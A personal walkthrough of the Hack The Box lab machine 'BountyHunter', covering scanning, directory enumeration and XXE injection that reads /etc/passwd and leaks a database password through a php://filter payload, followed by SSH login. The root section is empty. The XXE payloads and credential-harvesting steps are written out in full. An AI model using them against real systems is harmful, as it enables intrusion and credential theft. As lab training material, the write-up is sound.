# Hack The Box - BountyHunter

## This is my Writeup and walkthrough for BountyHunter machine  from Hack The Box.

![htb-bountyhunter](https://user-images.githubusercontent.com/36403473/137606272-577870e0-1b1f-44ee-86cf-046a5988d6a0.png)
## `Enumeration`
   
#### 1-Nmap 
```
nmap -sC -sV -Pn 10.10.11.100
Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-16 22:13 EET
Nmap scan report for 10.10.11.100
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
## `User acess` 

####  2- HTTP service
![screen1](https://user-images.githubusercontent.com/36403473/137603151-2db01eea-e091-4985-9781-6e9d032001ef.png)


hh don't worry i will use burp😂😂<br>

okey my methodology to `know what is this product do ` and i got that this platform for bug bounty okay let's brute force directories to see what is important so i usually use `dirsearch` for Quick  bruteforce 

![screen2](https://user-images.githubusercontent.com/36403473/137603143-e9940b1a-a1e9-497c-b49e-45d5643621fd.png)
 
lets check `/resources/` directory

![screen3](https://user-images.githubusercontent.com/36403473/137603536-1b20f1ca-87b6-4d89-be54-99ca3f778baa.png)

by checking `bountylog.js` it seems a juicy file 
![screen4](https://user-images.githubusercontent.com/36403473/137603145-57cda49b-1751-4183-a913-2664bd15b48a.png)

**now lets analys this piece of code:** 

we notic data is sent to server  in `data` parameter in **xml** format so it seems **xml injection** 

so lets visit `tracker_diRbPr00f314.php`
![screen5](https://user-images.githubusercontent.com/36403473/137603146-d04cd586-f889-4833-9a2d-a5b4bda3ca21.png)

its include i think data that send to server lets open `burpsuite` to check request 

![screen9](https://user-images.githubusercontent.com/36403473/137604952-ee8822db-86be-45c4-9562-c1b17c212286.png)

very good this include data about your submission like `bug-bounty submission` dont forget this is bug-bounty platform 🧐🧐 

we will add `data` parameter  to request and send xml injection to try to read `/etc/passwd` file 

```
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
		<bugreport>
		<title>&xxe;</title>
		<cwe>kajskdajd</cwe>
		<cvss>8787</cvss>
		<reward>557575</reward>
		</bugreport>

````
i sent this data in `data` parameter but  i didn't get anything  🧐

okey no problem i made Bounty Report via  `log_submit.php` and it send request to `tracker_diRbPr00f314.php` page but i found my submition trasnport in `data` parameter its encoded  (url&base64)

![screen7](https://user-images.githubusercontent.com/36403473/137603148-3ed9e522-ca06-4c2b-b36c-3a9fcbfd5410.png)

##### thats very good lets encode our xml code and try to inject again 

![screen8](https://user-images.githubusercontent.com/36403473/137605272-2b51d560-7b33-4ef7-9586-5aad5f9fac42.png)

another trick we can do to reverse source code of `db.php` file by using "php://filter/convert.base64-encode/resource=db.php"

```
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php"> ]>
		<bugreport>
		<title>&xxe;</title>
		<cwe>kajskdajd</cwe>
		<cvss>8787</cvss>
		<reward>557575</reward>
		</bugreport>
```
![secreen10](https://user-images.githubusercontent.com/36403473/137605413-b7401f59-fe33-4b58-b1c4-97595127c23e.png)

after decoding this string 

```
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>

```

we got db user name and password actually i don't know what should i do with this credential so i decided to take brake and watch movie.....

`SSH` maybe lets try i thout that this password maybe for `ssh` no another thing to do so lets list all users we got it from `etc/passwd` file and login 

**acullay we can use tools like `hydra` to bruteforce user ** but i make it manually HOW!!

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
development:x:1000:1000:Development:/home/development:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
``` 
we can check users that have password on machine or Take a look at the uncommon users of Linux  but i recommend it when in small scop why!! not to make firewall if there to detect you ,accully i dont like bruteforce it my last choice 

#### Note that An  **x**   character indicates that encrypted password is stored in /etc/shadow file like `root:x:`

notic `development` user 
#### 3- SSH 
![screen11](https://user-images.githubusercontent.com/36403473/137606008-3e515acb-4ed8-454b-8308-333149468173.png)

## `ROOT acess` 






 

